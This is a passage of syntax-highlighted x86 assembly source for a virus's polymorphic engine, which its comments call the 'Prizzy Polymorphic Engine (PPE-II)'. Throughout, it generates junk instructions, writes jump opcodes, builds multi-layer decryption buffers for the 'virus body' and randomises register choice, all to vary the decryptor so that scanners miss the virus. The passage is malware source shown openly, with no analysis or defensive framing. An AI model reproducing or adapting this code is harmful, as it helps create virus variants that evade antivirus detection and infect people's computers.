        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">  </span><span class="sc1">;disbale register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decoder_back</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;build JNZ offset</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to jump to 3rd decoding loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function checks whether virus body has been decrypt-</span><span class="sc0">
        </span><span class="sc1">;ed by multi-layers engine and then jumps to the 3rd deco-</span><span class="sc0">
        </span><span class="sc1">;ding loop to finish that work :).</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_return</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc1">; generate offset to jump back</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; ready to JMP there</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">c_call_reg32</span><span class="sc0">        </span><span class="sc1">;edi-2 = call reg32 instr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">    </span><span class="sc1">;CALL reg32 --&gt; JMP reg32</span><span class="sc0">

        </span><span class="sc1">; generate final garbages</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__pgr_final</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__pgr_final</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to create multi-layer buffer ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function builds multi-layers buffer behind our poly-</span><span class="sc0">
        </span><span class="sc1">;morphic code.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_mlayer_buffer</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; copy buffer from memory to EDI</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;start of memory layer buf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_map</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;layers in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_size</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;size of the buffer</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; generate some last garbages</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
    </span><span class="sc5">__pgmb_generate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pgmb_generate</span><span class="sc0">

        </span><span class="sc1">; update multi-layer pointer in "ppe_get_layer_pointer"</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;start of mem layers buffers</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;EAX - poly_start = pos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglp_old_val</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglp_ov_where</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; update multi-layer pointer in "ppe_get_exloop"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pge_where</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; update multi-layer pointers in "ppe_get_next_layer_pointer"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;no gaps ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__pgmb_finish</span><span class="sc0">
    </span><span class="sc5">__pgmb_next_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc1">;where is the gap</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pgnlp_old</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get random number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pgnlp_old</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_num</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pgmb_next_change</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
    </span><span class="sc5">__pgmb_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function for write insignificant data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_gen_rnd_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000014h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">ppe_gen_rnd_fill</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ppe_gen_rnd_loop</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;far JMP's five bytes - 1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_buffer</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">ppe_gen_rnd_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_loop</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ functions returns (empty) base reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_get_reg</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ppe_get_empty_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_STACK</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__reg_to_bcd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs_bcd</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ random numbers ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_get_rnd32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;my special algorithm to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_seed</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;calculate a random number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">       </span><span class="sc1">;for Win32</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetTickCount</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">        </span><span class="sc1">;RDTCS instruction - read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;PCs ticks to EDX:EAX</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ppe_get_rnd_range</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ polymorphic tables (PPE-II) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">; some equ's needed by Prizzy Polymorphic Engine (PPE-II)</span><span class="sc0">

</span><span class="sc5">REG_NO_8BIT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;esi,edi,ebp aren't 8bit</span><span class="sc0">
</span><span class="sc5">REG_IS_STACK</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;reg is stack because of copro</span><span class="sc0">
</span><span class="sc5">REG_FLAGS</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;one byte to set tbl_regs' flags</span><span class="sc0">
</span><span class="sc5">USED_MEMORY</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">          </span><span class="sc1">;we must be far then 30 bytes in poly</span><span class="sc0">
</span><span class="sc5">USED_BASED</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;don't generate copro</span><span class="sc0">
</span><span class="sc5">USED_FLAGS</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;generated garbages can't modify flags</span><span class="sc0">

        </span><span class="sc1">; table of registers</span><span class="sc0">
        </span><span class="sc1">; DO NOT modify this table or the next because they're</span><span class="sc0">
        </span><span class="sc1">; dependent on - because of tranfer to reg_bcd</span><span class="sc0">

</span><span class="sc5">tbl_regs</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">;eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000001b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">;ecx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000010b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">;edx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000011b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">;ebx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000100b</span><span class="sc4">,</span><span class="sc5">REG_IS_STACK</span><span class="sc0">  </span><span class="sc1">;esp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000101b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">   </span><span class="sc1">;ebp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000110b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">   </span><span class="sc1">;esi</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000111b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">   </span><span class="sc1">;edi</span><span class="sc0">
</span><span class="sc5">end_regs</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table for use registers, DO NOT modify or move</span><span class="sc0">

</span><span class="sc5">tbl_regs_bcd</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000001b</span><span class="sc0">       </span><span class="sc1">;eax, st(0)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000010b</span><span class="sc0">       </span><span class="sc1">;ecx, st(1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000100b</span><span class="sc0">       </span><span class="sc1">;edx, st(2)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00001000b</span><span class="sc0">       </span><span class="sc1">;ebx, st(3)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00010000b</span><span class="sc0">       </span><span class="sc1">;esp, st(4)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00100000b</span><span class="sc0">       </span><span class="sc1">;ebp, st(5)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01000000b</span><span class="sc0">       </span><span class="sc1">;esi, st(4)</span><span class="sc0">
